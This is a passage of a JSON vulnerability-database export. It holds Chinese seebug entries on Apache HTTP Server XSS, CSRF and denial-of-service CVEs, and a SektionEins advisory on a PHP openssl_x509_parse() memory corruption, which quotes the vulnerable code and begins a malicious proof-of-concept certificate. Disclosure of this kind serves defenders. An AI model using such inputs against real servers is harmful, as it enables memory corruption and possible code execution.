MandrakeSoft Linux Mandrake 8.1 \r\n+ MandrakeSoft Linux Mandrake 8.0 ppc\r\n+ MandrakeSoft Linux Mandrake 8.0 \r\n+ MandrakeSoft Linux Mandrake 7.2 \r\n+ OpenPKG OpenPKG 1.0 \r\n+ RedHat Linux 7.2 ia64\r\n+ RedHat Linux 7.2 i386\r\n+ RedHat Linux 7.1 ia64\r\n+ RedHat Linux 7.1 i386\r\n+ RedHat Linux 7.1 alpha\r\n+ RedHat Linux 7.0 i386\r\n+ RedHat Linux 7.0 alpha\r\n+ RedHat Linux 6.2 sparc\r\n+ RedHat Linux 6.2 i386\r\n+ RedHat Linux 6.2 alpha\r\nApache Software Foundation Apache 1.3.20 \r\n- HP HP-UX 11.22 \r\n- HP HP-UX 11.20 \r\n+ MandrakeSoft Single Network Firewall 7.2 \r\n+ S.u.S.E. Linux 7.3 sparc\r\n+ S.u.S.E. Linux 7.3 ppc\r\n+ S.u.S.E. Linux 7.3 i386\r\n+ S.u.S.E. Linux 7.3 \r\n+ SGI IRIX 6.5.18 \r\n+ SGI IRIX 6.5.17 \r\n+ SGI IRIX 6.5.16 \r\n+ SGI IRIX 6.5.15 \r\n+ SGI IRIX 6.5.14 m\r\n+ SGI IRIX 6.5.14 f\r\n+ SGI IRIX 6.5.14 \r\n+ SGI IRIX 6.5.13 m\r\n+ SGI IRIX 6.5.13 f\r\n+ SGI IRIX 6.5.13 \r\n+ SGI IRIX 6.5.12 m\r\n+ SGI IRIX 6.5.12 f\r\n+ SGI IRIX 6.5.12 \r\n+ Slackware Linux 8.0 \r\n+ Sun Cobalt Control Station 4100CS \r\n+ Sun Cobalt RaQ 550 \r\n+ Sun Solaris 9_x86 Update 2\r\n+ Sun Solaris 9_x86\r\n+ Sun Solaris 9\r\n+ Sun SunOS 5.9 _x86\r\n+ Sun SunOS 5.9 \r\nApache Software Foundation Apache 1.3.19 \r\n- Apple Mac OS X 10.0.3 \r\n- Caldera OpenLinux 2.4 \r\n+ Debian Linux 2.3 \r\n- Digital (Compaq) TRU64/DIGITAL UNIX 5.0 \r\n- Digital (Compaq) TRU64/DIGITAL UNIX 4.0 g\r\n- Digital (Compaq) TRU64/DIGITAL UNIX 4.0 f\r\n+ EnGarde Secure Linux 1.0.1 \r\n- FreeBSD FreeBSD 4.2 \r\n- FreeBSD FreeBSD 3.5.1 \r\n- HP HP-UX 11.11 \r\n- HP HP-UX 11.0 4\r\n- HP HP-UX 11.0 \r\n- HP HP-UX 10.20 \r\n+ HP Secure OS software for Linux 1.0 \r\n- HP VirtualVault 4.5 \r\n+ MandrakeSoft Linux Mandrake 8.1 \r\n- MandrakeSoft Linux Mandrake 8.0 \r\n- MandrakeSoft Linux Mandrake 7.2 \r\n- MandrakeSoft Linux Mandrake 7.1 \r\n- NetBSD NetBSD 1.5.1 \r\n- NetBSD NetBSD 1.5 \r\n+ OpenBSD OpenBSD 2.9 \r\n- OpenBSD OpenBSD 2.8 \r\n+ OpenBSD OpenBSD 3.0\r\n- RedHat Linux 7.1 \r\n- RedHat Linux 7.0 \r\n- RedHat Linux 6.2 \r\n+ S.u.S.E. Linux 7.2 i386\r\n+ S.u.S.E. Linux 7.2 \r\n+ S.u.S.E. Linux 7.1 x86\r\n+ S.u.S.E. Linux 7.1 sparc\r\n+ S.u.S.E. Linux 7.1 ppc\r\n+ S.u.S.E. Linux 7.1 alpha\r\n+ S.u.S.E. Linux 7.1 \r\n+ S.u.S.E. Linux 7.0 sparc\r\n+ S.u.S.E. Linux 7.0 ppc\r\n+ S.u.S.E. Linux 7.0 i386\r\n+ S.u.S.E. Linux 7.0 alpha\r\n+ S.u.S.E. Linux 7.0 \r\n+ S.u.S.E. Linux 6.4 ppc\r\n+ S.u.S.E. Linux 6.4 i386\r\n+ S.u.S.E. Linux 6.4 alpha\r\n+ S.u.S.E. Linux 6.4 \r\n- SCO eDesktop 2.4 \r\n- SCO eServer 2.3.1 \r\n- SGI IRIX 6.5.9 \r\n- SGI IRIX 6.5.8 \r\n- Sun Solaris 7.0 \r\n- Sun Solaris 8\r\nApache Software Foundation Apache 1.3.18 \r\nApache Software Foundation Apache 1.3.17 \r\n+ MandrakeSoft Corporate Server 1.0.1 \r\n+ MandrakeSoft Linux Mandrake 8.0 ppc\r\n+ MandrakeSoft Linux Mandrake 8.0 \r\n+ OpenBSD OpenBSD 2.8 \r\n+ S.u.S.E. Linux 7.1 \r\nApache Software Foundation Apache 1.3.14 \r\n+ EnGarde Secure Linux 1.0.1 \r\n+ MandrakeSoft Linux Mandrake 7.2 \r\n+ MandrakeSoft Linux Mandrake 7.1 \r\n- MandrakeSoft Single Network Firewall 7.2 \r\n+ SGI IRIX 6.5.11 \r\n+ SGI IRIX 6.5.10 \r\n+ SGI IRIX 6.5.9 \r\n+ SGI IRIX 6.5.8 \r\n+ SGI IRIX 6.5.7 \r\n+ SGI IRIX 6.5.6 \r\n+ SGI IRIX 6.5.5 \r\n+ SGI IRIX 6.5.4 \r\n+ SGI IRIX 6.5.3 \r\n+ SGI IRIX 6.5.2 \r\n+ SGI IRIX 6.5.1 \r\n+ SGI IRIX 6.5 \r\nApache Software Foundation Apache 1.3.12 \r\n+ NetScreen NetScreen-Global PRO Express Policy Manager Server \r\n+ NetScreen NetScreen-Global PRO Policy Manager Server \r\n+ OpenBSD OpenBSD 2.8 \r\n+ RedHat Linux 7.0 i386\r\n+ RedHat Linux 7.0 alpha\r\n+ RedHat Linux 6.2 sparc\r\n+ RedHat Linux 6.2 i386\r\n+ RedHat Linux 6.2 alpha\r\n+ S.u.S.E. Linux 7.0 sparc\r\n+ S.u.S.E. Linux 7.0 \r\n+ Sun Cobalt ManageRaQ v2 3599BD \r\n+ Sun Cobalt Qube3 4000WG \r\n+ Sun Cobalt RaQ XTR 3500R \r\n+ Sun Cobalt RaQ4 3001R \r\nApache Software Foundation Apache 1.3.11 \r\nApache Software Foundation Apache 1.3.9 \r\n+ Debian Linux 2.2 sparc\r\n+ Debian Linux 2.2 powerpc\r\n+ Debian Linux 2.2 arm\r\n+ Debian Linux 2.2 alpha\r\n+ Debian Linux 2.2 68k\r\n+ Debian Linux 2.2 \r\n+ NetScreen NetScreen-Global PRO Express Policy Manager Server \r\n+ NetScreen NetScreen-Global PRO Policy Manager Server \r\n+ Sun Solaris 8_x86\r\n+ Sun Solaris 8\r\n+ Sun SunOS 5.8 _x86\r\n+ Sun SunOS 5.8 \r\nApache Software Foundation Apache 1.3.7 -dev\r\nApache Software Foundation Apache 1.3.6 \r\n+ Sun Cobalt ManageRaQ3 3000R-mr \r\n+ Sun Cobalt RaQ3 3000R \r\n+ Sun Cobalt Velociraptor \r\nApache Software Foundation Apache 1.3.4 \r\n+ BSDI BSD/OS 4.0 \r\nApache Software Foundation Apache 1.3.3 \r\n+ RedHat Linux 5.2 sparc\r\n+ RedHat Linux 5.2 i386\r\n+ RedHat Linux 5.2 alpha\r\nApache Software Foundation Apache 2.2.6-dev\r\nApache Software Foundation Apache 2.2.5-dev\r\nApache Software Foundation Apache 2.0.61-dev\r\nApache Software Foundation Apache 2.0.60-dev\r\n\n \u5382\u5546\u89e3\u51b3\u65b9\u6848\r\nApache 2.2.7-dev\u5df2\u7ecf\u4fee\u6b63\u6b64\u6f0f\u6d1e\uff1a\r\n<a href=http://www.apache.org/ target=_blank>http://www.apache.org/</a>",
            "modified": "2008-01-14T00:00:00",
            "published": "2008-01-14T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-2818",
            "id": "SSV:2818",
            "title": "Apache HTTP Server 2.2.6, 2.0.61\u548c1.3.39 'mod_status'\u8de8\u7ad9\u811a\u672c\u6f0f\u6d1e",
            "type": "seebug",
            "sourceData": "",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:PARTIAL/A:NONE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:2818"
        }
    ],
    "CVE-2007-6422": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ ID: 27236\r\nCVE ID:CVE-2007-6420\r\nCVE-2007-6421\r\nCVE-2007-6422\r\nCVE-2007-6423\r\nCNCVE ID:CNCVE-20076420\r\nCNCVE-20076421\r\nCNCVE-20076422\r\nCNCVE-20076423\r\n\r\nApache HTTP Server\u662f\u4e00\u6b3e\u5f00\u653e\u6e90\u7801\u7684WEB\u670d\u52a1\u7a0b\u5e8f\u3002\r\nApache HTTP Server\u5305\u542b\u7684mod_proxy_balancer\u6a21\u5757\u5b58\u5728\u8f93\u5165\u9a8c\u8bc1\u95ee\u9898\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u6f0f\u6d1e\u8fdb\u884c\u8de8\u7ad9\u811a\u672c\uff0cCSRF\uff0c\u62d2\u7edd\u670d\u52a1\u7b49\u653b\u51fb\u3002\r\n1\uff0c\u7531\u4e8e\u6240\u6709\u884c\u4e3a\u901a\u8fc7GET\u8bbf\u95ee\u6267\u884c\uff0c\u5b58\u5728\u201cCSRF\u201d\u653b\u51fb\u3002\r\n2\uff0c&quot;mod_proxy_balancer.c&quot;\u5b58\u5728\u8de8\u7ad9\u811a\u672c\u95ee\u9898\uff0c\u8f93\u5165\u4f20\u9012\u7ed9\uff1a\r\n&quot;ss&quot; - \u4e3a&quot;&quot;StickySession Identifier&quot;,\r\n&quot;wr&quot; - \u4e3a&quot;Route&quot;,\r\n&quot;rr&quot; - \u4e3a&quot;Route Redirect&quot;\uff0c\r\n\u53c2\u6570\u6ca1\u6709\u8fdb\u884c\u4efb\u4f55\u8fc7\u6ee4\u53ef\u5bfc\u81f4\u4efb\u610fHTML\u548c\u811a\u672c\u4ee3\u7801\u6267\u884c\u3002\r\n\u53e6\u5916\u5bf9&quot;balancer-mamanger&quot;\u53c2\u6570\u7f3a\u5c11\u8fc7\u6ee4\uff0c\u4e5f\u53ef\u5bfc\u81f4\u4efb\u610fHTML\u548c\u811a\u672c\u4ee3\u7801\u6267\u884c\u3002\r\n3\uff0c\u7ba1\u7406\u8d1f\u8d23loadfactors\u548cmember\u72b6\u6001\u7684&quot;balancer_handler()&quot;\u5b58\u5728\u9519\u8bef\uff0c\u5f53\u7f16\u8f91\u5de5\u4f5c\u8bbe\u7f6e\u4f7f\u653b\u51fb\u8005\u8f93\u5165\u975e\u6cd5&quot;b&quot;\u53d8\u91cf\u53ef\u5bfc\u81f4\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u3002\r\n4\uff0c\u5f53\u5728URL\u4e2d\u8f93\u51657390 or 7506\u62167622 &quot;A&quot;\u5b57\u7b26\u65f6\u4f1a\u7531\u4e8e&quot;mod_proxy_balancer&quot;\u9519\u8bef\u800c\u5bfc\u81f4\u5185\u5b58\u7834\u574f\u3002\r\n\n\nApache Software Foundation Apache 2.2.6 \r\nApache Software Foundation Apache 2.2.5 \r\nApache Software Foundation Apache 2.2.4 \r\nApache Software Foundation Apache 2.2.3 \r\nApache Software Foundation Apache 2.2.2 \r\nApache Software Foundation Apache 2.2 .0\r\nApache Software Foundation Apache 2.2.6-dev\r\nApache Software Foundation Apache 2.2.5-dev\n \u5382\u5546\u89e3\u51b3\u65b9\u6848\r\nApache 2.2.7-dev\u5df2\u7ecf\u4fee\u6b63\u6b64\u6f0f\u6d1e\uff1a\r\n<a href=http://www.apache.org/ target=_blank>http://www.apache.org/</a>",
            "modified": "2008-01-14T00:00:00",
            "published": "2008-01-14T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-2820",
            "id": "SSV:2820",
            "title": "Apache 'mod_proxy_balancer'\u5b58\u5728\u591a\u4e2a\u6f0f\u6d1e",
            "type": "seebug",
            "sourceData": "",
            "cvss": {
                "score": 7.8,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:2820"
        }
    ],
    "CVE-2007-6421": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ ID: 27236\r\nCVE ID:CVE-2007-6420\r\nCVE-2007-6421\r\nCVE-2007-6422\r\nCVE-2007-6423\r\nCNCVE ID:CNCVE-20076420\r\nCNCVE-20076421\r\nCNCVE-20076422\r\nCNCVE-20076423\r\n\r\nApache HTTP Server\u662f\u4e00\u6b3e\u5f00\u653e\u6e90\u7801\u7684WEB\u670d\u52a1\u7a0b\u5e8f\u3002\r\nApache HTTP Server\u5305\u542b\u7684mod_proxy_balancer\u6a21\u5757\u5b58\u5728\u8f93\u5165\u9a8c\u8bc1\u95ee\u9898\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u6f0f\u6d1e\u8fdb\u884c\u8de8\u7ad9\u811a\u672c\uff0cCSRF\uff0c\u62d2\u7edd\u670d\u52a1\u7b49\u653b\u51fb\u3002\r\n1\uff0c\u7531\u4e8e\u6240\u6709\u884c\u4e3a\u901a\u8fc7GET\u8bbf\u95ee\u6267\u884c\uff0c\u5b58\u5728\u201cCSRF\u201d\u653b\u51fb\u3002\r\n2\uff0c&quot;mod_proxy_balancer.c&quot;\u5b58\u5728\u8de8\u7ad9\u811a\u672c\u95ee\u9898\uff0c\u8f93\u5165\u4f20\u9012\u7ed9\uff1a\r\n&quot;ss&quot; - \u4e3a&quot;&quot;StickySession Identifier&quot;,\r\n&quot;wr&quot; - \u4e3a&quot;Route&quot;,\r\n&quot;rr&quot; - \u4e3a&quot;Route Redirect&quot;\uff0c\r\n\u53c2\u6570\u6ca1\u6709\u8fdb\u884c\u4efb\u4f55\u8fc7\u6ee4\u53ef\u5bfc\u81f4\u4efb\u610fHTML\u548c\u811a\u672c\u4ee3\u7801\u6267\u884c\u3002\r\n\u53e6\u5916\u5bf9&quot;balancer-mamanger&quot;\u53c2\u6570\u7f3a\u5c11\u8fc7\u6ee4\uff0c\u4e5f\u53ef\u5bfc\u81f4\u4efb\u610fHTML\u548c\u811a\u672c\u4ee3\u7801\u6267\u884c\u3002\r\n3\uff0c\u7ba1\u7406\u8d1f\u8d23loadfactors\u548cmember\u72b6\u6001\u7684&quot;balancer_handler()&quot;\u5b58\u5728\u9519\u8bef\uff0c\u5f53\u7f16\u8f91\u5de5\u4f5c\u8bbe\u7f6e\u4f7f\u653b\u51fb\u8005\u8f93\u5165\u975e\u6cd5&quot;b&quot;\u53d8\u91cf\u53ef\u5bfc\u81f4\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u3002\r\n4\uff0c\u5f53\u5728URL\u4e2d\u8f93\u51657390 or 7506\u62167622 &quot;A&quot;\u5b57\u7b26\u65f6\u4f1a\u7531\u4e8e&quot;mod_proxy_balancer&quot;\u9519\u8bef\u800c\u5bfc\u81f4\u5185\u5b58\u7834\u574f\u3002\r\n\n\nApache Software Foundation Apache 2.2.6 \r\nApache Software Foundation Apache 2.2.5 \r\nApache Software Foundation Apache 2.2.4 \r\nApache Software Foundation Apache 2.2.3 \r\nApache Software Foundation Apache 2.2.2 \r\nApache Software Foundation Apache 2.2 .0\r\nApache Software Foundation Apache 2.2.6-dev\r\nApache Software Foundation Apache 2.2.5-dev\n \u5382\u5546\u89e3\u51b3\u65b9\u6848\r\nApache 2.2.7-dev\u5df2\u7ecf\u4fee\u6b63\u6b64\u6f0f\u6d1e\uff1a\r\n<a href=http://www.apache.org/ target=_blank>http://www.apache.org/</a>",
            "modified": "2008-01-14T00:00:00",
            "published": "2008-01-14T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-2820",
            "id": "SSV:2820",
            "title": "Apache 'mod_proxy_balancer'\u5b58\u5728\u591a\u4e2a\u6f0f\u6d1e",
            "type": "seebug",
            "sourceData": "",
            "cvss": {
                "score": 7.8,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:2820"
        }
    ],
    "CVE-2007-6423": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ ID: 27236\r\nCVE ID:CVE-2007-6420\r\nCVE-2007-6421\r\nCVE-2007-6422\r\nCVE-2007-6423\r\nCNCVE ID:CNCVE-20076420\r\nCNCVE-20076421\r\nCNCVE-20076422\r\nCNCVE-20076423\r\n\r\nApache HTTP Server\u662f\u4e00\u6b3e\u5f00\u653e\u6e90\u7801\u7684WEB\u670d\u52a1\u7a0b\u5e8f\u3002\r\nApache HTTP Server\u5305\u542b\u7684mod_proxy_balancer\u6a21\u5757\u5b58\u5728\u8f93\u5165\u9a8c\u8bc1\u95ee\u9898\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u6f0f\u6d1e\u8fdb\u884c\u8de8\u7ad9\u811a\u672c\uff0cCSRF\uff0c\u62d2\u7edd\u670d\u52a1\u7b49\u653b\u51fb\u3002\r\n1\uff0c\u7531\u4e8e\u6240\u6709\u884c\u4e3a\u901a\u8fc7GET\u8bbf\u95ee\u6267\u884c\uff0c\u5b58\u5728\u201cCSRF\u201d\u653b\u51fb\u3002\r\n2\uff0c&quot;mod_proxy_balancer.c&quot;\u5b58\u5728\u8de8\u7ad9\u811a\u672c\u95ee\u9898\uff0c\u8f93\u5165\u4f20\u9012\u7ed9\uff1a\r\n&quot;ss&quot; - \u4e3a&quot;&quot;StickySession Identifier&quot;,\r\n&quot;wr&quot; - \u4e3a&quot;Route&quot;,\r\n&quot;rr&quot; - \u4e3a&quot;Route Redirect&quot;\uff0c\r\n\u53c2\u6570\u6ca1\u6709\u8fdb\u884c\u4efb\u4f55\u8fc7\u6ee4\u53ef\u5bfc\u81f4\u4efb\u610fHTML\u548c\u811a\u672c\u4ee3\u7801\u6267\u884c\u3002\r\n\u53e6\u5916\u5bf9&quot;balancer-mamanger&quot;\u53c2\u6570\u7f3a\u5c11\u8fc7\u6ee4\uff0c\u4e5f\u53ef\u5bfc\u81f4\u4efb\u610fHTML\u548c\u811a\u672c\u4ee3\u7801\u6267\u884c\u3002\r\n3\uff0c\u7ba1\u7406\u8d1f\u8d23loadfactors\u548cmember\u72b6\u6001\u7684&quot;balancer_handler()&quot;\u5b58\u5728\u9519\u8bef\uff0c\u5f53\u7f16\u8f91\u5de5\u4f5c\u8bbe\u7f6e\u4f7f\u653b\u51fb\u8005\u8f93\u5165\u975e\u6cd5&quot;b&quot;\u53d8\u91cf\u53ef\u5bfc\u81f4\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u3002\r\n4\uff0c\u5f53\u5728URL\u4e2d\u8f93\u51657390 or 7506\u62167622 &quot;A&quot;\u5b57\u7b26\u65f6\u4f1a\u7531\u4e8e&quot;mod_proxy_balancer&quot;\u9519\u8bef\u800c\u5bfc\u81f4\u5185\u5b58\u7834\u574f\u3002\r\n\n\nApache Software Foundation Apache 2.2.6 \r\nApache Software Foundation Apache 2.2.5 \r\nApache Software Foundation Apache 2.2.4 \r\nApache Software Foundation Apache 2.2.3 \r\nApache Software Foundation Apache 2.2.2 \r\nApache Software Foundation Apache 2.2 .0\r\nApache Software Foundation Apache 2.2.6-dev\r\nApache Software Foundation Apache 2.2.5-dev\n \u5382\u5546\u89e3\u51b3\u65b9\u6848\r\nApache 2.2.7-dev\u5df2\u7ecf\u4fee\u6b63\u6b64\u6f0f\u6d1e\uff1a\r\n<a href=http://www.apache.org/ target=_blank>http://www.apache.org/</a>",
            "modified": "2008-01-14T00:00:00",
            "published": "2008-01-14T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-2820",
            "id": "SSV:2820",
            "title": "Apache 'mod_proxy_balancer'\u5b58\u5728\u591a\u4e2a\u6f0f\u6d1e",
            "type": "seebug",
            "sourceData": "",
            "cvss": {
                "score": 7.8,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:2820"
        }
    ],
    "CVE-2007-5000": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 26838\r\nCVE(CAN) ID: CVE-2007-5000\r\n\r\nApache HTTP Server\u662f\u4e00\u6b3e\u6d41\u884c\u7684Web\u670d\u52a1\u5668\u3002\r\n\r\nApache\u7684mod_imagemap\u548cmod_imap\u6a21\u5757\u4e2d\u6ca1\u6709\u6b63\u786e\u5730\u8fc7\u6ee4\u67d0\u4e9b\u7528\u6237\u8f93\u5165\uff0c\u5141\u8bb8\u8fdc\u7a0b\u653b\u51fb\u8005\u63d0\u4ea4\u6076\u610f\u7684HTTP\u8bf7\u6c42\u6267\u884c\u8de8\u7ad9\u811a\u672c\u653b\u51fb\u3002\r\n\n\nApache Group Apache 2.2.0 - 2.2.6\r\nApache Group Apache 2.0.35 - 2.0.61 \r\nApache Group Apache 1.3.0 - 1.3.39\n Apache Group\r\n------------\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\n<a href=http://www.apache.org target=_blank>http://www.apache.org</a>",
            "modified": "2008-01-11T00:00:00",
            "published": "2008-01-11T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-2801",
            "id": "SSV:2801",
            "type": "seebug",
            "title": "Apache mod_imagemap\u548cmod_imap\u6a21\u5757\u8de8\u7ad9\u811a\u672c\u6f0f\u6d1e",
            "sourceData": "",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:PARTIAL/A:NONE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:2801"
        }
    ],
    "CVE-2013-6420": [
        {
            "bulletinFamily": "exploit",
            "description": "No description provided by source.",
            "modified": "2014-07-01T00:00:00",
            "published": "2014-07-01T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-83792",
            "id": "SSV:83792",
            "title": "PHP openssl_x509_parse() - Memory Corruption Vulnerability",
            "type": "seebug",
            "sourceData": "\n                                                                         SektionEins GmbH\r\n                        www.sektioneins.de\r\n\r\n                     -= Security  Advisory =-\r\n\r\n     Advisory: PHP openssl_x509_parse() Memory Corruption Vulnerability\r\n Release Date: 2013/12/13\r\nLast Modified: 2013/12/13\r\n       Author: Stefan Esser [stefan.esser[at]sektioneins.de]\r\n\r\n  Application: PHP 4.0.6 - PHP 4.4.9\r\n               PHP 5.0.x\r\n               PHP 5.1.x\r\n               PHP 5.2.x\r\n               PHP 5.3.0 - PHP 5.3.27\r\n               PHP 5.4.0 - PHP 5.4.22\r\n               PHP 5.5.0 - PHP 5.5.6\r\n     Severity: PHP applications using openssl_x509_parse() to parse a\r\n               malicious x509 certificate might trigger a memory\r\n               corruption that might result in arbitrary code execution\r\n         Risk: Critical\r\nVendor Status: Vendor has released PHP 5.5.7, PHP 5.4.23 and PHP 5.3.28\r\n               that contain a fix for this vulnerability\r\n    Reference:\r\nhttp://www.sektioneins.de/advisories/advisory-012013-php-openssl_x509_parse-memory-corruption-vulnerability.html\r\n\r\nOverview:\r\n\r\n  Quote from http://www.php.net\r\n  &#34;PHP is a widely-used general-purpose scripting language that\r\n   is especially suited for Web development and can be embedded\r\n   into HTML.&#34;\r\n\r\n  The PHP function openssl_x509_parse() uses a helper function\r\n  called asn1_time_to_time_t() to convert timestamps from ASN1\r\n  string format into integer timestamp values. The parser within\r\n  this helper function is not binary safe and can therefore be\r\n  tricked to write up to five NUL bytes outside of an allocated\r\n  buffer.\r\n \r\n  This problem can be triggered by x509 certificates that contain\r\n  NUL bytes in their notBefore and notAfter timestamp fields and\r\n  leads to a memory corruption that might result in arbitrary\r\n  code execution.\r\n \r\n  Depending on how openssl_x509_parse() is used within a PHP\r\n  application the attack requires either a malicious cert signed\r\n  by a compromised/malicious CA or can be carried out with a\r\n  self-signed cert.\r\n\r\nDetails:\r\n\r\n  The PHP function openssl_x509_parse() is used by PHP applications\r\n  to parse additional information out of x509 certificates, usually\r\n  to harden SSL encrypted communication channels against MITM\r\n  attacks. In the wild we have seen the following use cases for this\r\n  function:\r\n \r\n   * output certificate debugging information\r\n     (e.g. cacert.org/analyse.php)\r\n   * webmail application with SMIME support\r\n   * client certificate handling\r\n   * certificate pinning\r\n   * verification of other certificate properties\r\n     (e.g. a default Wordpress install if ext/curl is not loaded)\r\n     \r\n  When we backported security fixes for some previous security\r\n  vulnerabilities in PHP&#39;s openssl to PHP 4.4.9 as part of our\r\n  PHP security backport services that we provide to customers,\r\n  we performed a quick audit of openssl_x509_parse() and all the\r\n  functions it calls, which led to the discovery of a memory\r\n  corruption vulnerability.\r\n \r\n  Within the function openssl_x509_parse() the helper function\r\n  asn1_time_to_time_t() is called two times to parse the\r\n  notBefore and notAfter ASN1 string timestamps from the cert\r\n  into integer time_t values as you can see below:\r\n \r\n     add_assoc_long(return_value, &#34;validFrom_time_t&#34;,\r\nasn1_time_to_time_t(X509_get_notBefore(cert) TSRMLS_CC));\r\n     add_assoc_long(return_value, &#34;validTo_time_t&#34;,\r\nasn1_time_to_time_t(X509_get_notAfter(cert) TSRMLS_CC));\r\n \r\n  When you take a look into this helper function you will see\r\n  that it only contains a quickly hacked parser that was never\r\n  really improved since its introduction in PHP 4.0.6. The author\r\n  of this parser was even aware of its hackishness as you can see\r\n  from the error message contained in the code:\r\n \r\n  static time_t asn1_time_to_time_t(ASN1_UTCTIME * timestr TSRMLS_DC) /*\r\n{{{ */\r\n  {\r\n  /*\r\n     This is how the time string is formatted:\r\n     snprintf(p, sizeof(p), &#34;%02d%02d%02d%02d%02d%02dZ&#34;,ts-&#62;tm_year%100,\r\n        ts-&#62;tm_mon+1,ts-&#62;tm_mday,ts-&#62;tm_hour,ts-&#62;tm_min,ts-&#62;tm_sec);\r\n  */\r\n\r\n     time_t ret;\r\n     struct tm thetime;\r\n     char * strbuf;\r\n     char * thestr;\r\n     long gmadjust = 0;\r\n\r\n     if (timestr-&#62;length &#60; 13) {\r\n        php_error_docref(NULL TSRMLS_CC, E_WARNING, &#34;extension author\r\ntoo lazy to parse %s correctly&#34;, timestr-&#62;data);\r\n        return (time_t)-1;\r\n     }\r\n\r\n However the actual problem of the code should become obvious when\r\n you read the rest of the parsing code that attempts to first\r\n duplicate the timestamp string and then parses the timestamp by\r\n going through the copy in reverse order and writing five NUL bytes\r\n into the duplicated string.\r\n\r\n     strbuf = estrdup((char *)timestr-&#62;data);\r\n\r\n     memset(&thetime, 0, sizeof(thetime));\r\n\r\n     /* we work backwards so that we can use atoi more easily */\r\n\r\n     thestr = strbuf + timestr-&#62;length - 3;\r\n\r\n     thetime.tm_sec = atoi(thestr);\r\n     *thestr = &#39;\\0&#39;;\r\n     thestr -= 2;\r\n     thetime.tm_min = atoi(thestr);\r\n     *thestr = &#39;\\0&#39;;\r\n     thestr -= 2;\r\n     thetime.tm_hour = atoi(thestr);\r\n     *thestr = &#39;\\0&#39;;\r\n     thestr -= 2;\r\n     thetime.tm_mday = atoi(thestr);\r\n     *thestr = &#39;\\0&#39;;\r\n     thestr -= 2;\r\n     thetime.tm_mon = atoi(thestr)-1;\r\n     *thestr = &#39;\\0&#39;;\r\n     thestr -= 2;\r\n     thetime.tm_year = atoi(thestr);\r\n\r\n  The problem with this code is that ASN1 strings can contain NUL\r\n  bytes, while the parser is not binary safe. This means if a\r\n  timestamp string inside a x509 certificate contains a NUL byte\r\n  at e.g. position 13 the estrdup() will only allocate 14 bytes\r\n  for a copy of the string, but the parser will attempt to write\r\n  five NUL bytes to memory addressed by the ASN1 length of the\r\n  string. If the real string length is longer than 16 bytes this\r\n  will result in writes of NUL bytes outside of the allocated\r\n  buffer.\r\n \r\n  Because of PHP&#39;s deterministic heap memory layout that can be\r\n  controlled a lot by sending e.g. POST variables and using\r\n  duplicate variable names to poke memory holes this vulnerability\r\n  must be considered exploitable. However the actual exploit will\r\n  depend a lot on how the PHP application uses openssl_x509_parse()\r\n  and a lot of other factors.\r\n\r\n  Depending on which of the actual use cases the function is used\r\n  for by an application, an attacker can trigger the memory\r\n  corruption with a self-signed certificate. An example for this\r\n  is the public analyse.php x509 cert debugging script provided\r\n  by CACert on their webserver.\r\n \r\n  Other applications like Wordpress use openssl_x509_parse() to\r\n  further verify SSL certificates whenever Wordpress connects to\r\n  a HTTPS URL (in case ext/curl is not loaded which is the default\r\n  for several linux distributions). Because the parsing only\r\n  happens after the initial SSL connection is established this\r\n  can only be abused by attackers controlling a malicious trusted\r\n  cert. However recent disclosures of alleged NSA capabilities,\r\n  the French incident and disclosures about fully compromised\r\n  trusted CAs in the past years have shown that this capability\r\n  might be in the reach of malicious attackers.\r\n\r\n\r\nProof of Concept:\r\n\r\n  The following x509 certificate demonstrates the out of bounds write:\r\n \r\n  -----BEGIN CERTIFICATE-----\r\n  MIIEpDCCA4ygAwIBAgIJAJzu8r6u6eBcMA0GCSqGSIb3DQEBBQUAMIHDMQswCQYD\r\n  VQQGEwJERTEcMBoGA1UECAwTTm9yZHJoZWluLVdlc3RmYWxlbjEQMA4GA1UEBwwH\r\n  S8ODwrZsbjEUMBIGA1UECgwLU2VrdGlvbkVpbnMxHzAdBgNVBAsMFk1hbGljaW91\r\n  cyBDZXJ0IFNlY3Rpb24xITAfBgNVBAMMGG1hbGljaW91cy5zZWt0aW9uZWlucy5k\r\n  ZTEqMCgGCSqGSIb3DQEJARYbc3RlZmFuLmVzc2VyQHNla3Rpb25laW5zLmRlMHUY\r\n  ZDE5NzAwMTAxMDAwMDAwWgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n  